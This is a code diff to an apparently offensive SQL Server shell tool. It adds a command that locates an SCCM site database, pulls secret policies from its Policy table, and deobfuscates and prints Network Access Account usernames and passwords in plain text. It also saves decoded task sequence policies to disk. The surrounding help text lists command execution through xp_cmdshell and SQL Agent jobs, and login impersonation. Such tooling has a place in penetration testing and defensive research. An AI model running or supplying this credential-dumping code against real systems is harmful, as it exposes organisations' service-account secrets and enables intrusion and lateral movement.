@@ -70,7 +70,8 @@ class SQLSHELL(cmd.Cmd):
     enum_owner                 - enum db owner
     exec_as_user {user}        - impersonate with execute as user
     exec_as_login {login}      - impersonate with execute as login
-    speak_to_the_manager       - dump SCCM policies
+    speak_to_the_manager       - dump SCCM policies (requires DBO/MP stored proc access)
+    yell_at_the_manager        - dump SCCM policies (db_datareader, no stored procs needed)
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     xp_dirtree {path}          - executes xp_dirtree on the path
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
@@ -390,6 +391,92 @@ class SQLSHELL(cmd.Cmd):
                                     print(f"[*] Could not deobfuscate Task Sequence: {e}")
 
                          
+        except Exception as e:
+            print(e)
+            pass
+        except:
+            pass
+
+    
+    def do_yell_at_the_manager(self, line):
+        if not os.path.isdir("karen"):
+            os.mkdir("karen")
+            os.mkdir("karen/policies")
+            os.mkdir("karen/deobfuscated")
+        try:
+            if not self.sql.currentDB.startswith('CM_'):
+                print("[*] Not in an SCCM database, searching for CM_* databases...")
+                db_result = self.sql_query("SELECT name FROM sys.databases WHERE name LIKE 'CM_%'")
+                if db_result:
+                    sccm_db = db_result[0]['name']
+                    print(f"[+] Found SCCM database: {sccm_db}")
+                    self.sql_query(f"USE {sccm_db}")
+                else:
+                    print("[-] No CM_* database found, continuing in current database")
+
+            print("[*] Querying secret policies from Policy table")
+            secret_policies = self.sql_query(
+                "SELECT PolicyID, Body FROM Policy "
+                "WHERE PolicyFlags & 2 > 0 AND ISNULL(DATALENGTH(Body), 0) > 0"
+            )
+
+            if not secret_policies:
+                print("[-] No secret policies found or access denied to Policy table")
+                return
+
+            print(f"[+] Found {len(secret_policies)} secret policies")
+            for policy_info in secret_policies:
+                try:
+                    policy_id = policy_info['PolicyID']
+                    body = policy_info['Body']
+                    safe_policy_id = str(policy_id).replace('/', '_')
+
+                    if isinstance(body, bytes):
+                        bytes_data = bytes.fromhex(body.decode('ascii'))
+                    else:
+                        bytes_data = bytes.fromhex(str(body))
+
+                    decoded_text = bytes_data.decode('utf-16-le').lstrip('feff')
+
+                    with open(f"karen/policies/{safe_policy_id}.xml", 'w', encoding='utf-8') as f:
+                        f.write(decoded_text)
+
+                    root = ET.fromstring(decoded_text)
+                    for elem in root.iter():
+                        if elem.get('class') == 'CCM_NetworkAccessAccount':
+                            print("[+] Found NAA Policy")
+                            for prop in elem.findall(".//*[@name='NetworkAccessUsername']"):
+                                value = prop.find("value")
+                                if value is not None and value.text:
+                                    username = deobfuscate_credential_string(value.text.strip())
+                                    username = username[:username.rfind('\x00')]
+                                    print("[!] Network Access Account Username: '" + username + "'")
+                            for prop in elem.findall(".//*[@name='NetworkAccessPassword']"):
+                                value = prop.find("value")
+                                if value is not None and value.text:
+                                    password = deobfuscate_credential_string(value.text.strip())
+                                    password = password[:password.rfind('\x00')]
+                                    print("[!] Network Access Account Password: '" + password + "'")
+                        if elem.get('name') == 'TS_Sequence':
+                            print("[+] Found Task Sequence policy")
+                            value_elem = elem.find("value")
+                            if value_elem is not None and value_elem.text:
+                                ts_data = value_elem.text.strip()
+                                try:
+                                    ts_sequence = deobfuscate_credential_string(ts_data)
+                                    ts_hash = hashlib.md5(ts_sequence.encode()).hexdigest()
+                                    print("[!] Successfully deobfuscated task sequence")
+                                    with open(f"karen/deobfuscated/ts_sequence_{ts_hash}.xml", 'w', encoding='utf-8') as f:
+                                        f.write(ts_sequence)
+                                        print(f"[+] Task sequence policy saved to karen/deobfuscated/ts_sequence_{ts_hash}.xml")
+                                except Exception as e:
+                                    print(f"[*] Could not deobfuscate Task Sequence: {e}")
+                except ET.ParseError:
+                    continue
+                except Exception as e:
+                    print(f"[*] Error processing policy: {e}")
+                    continue
+
         except Exception as e:
             print(e)
             pass
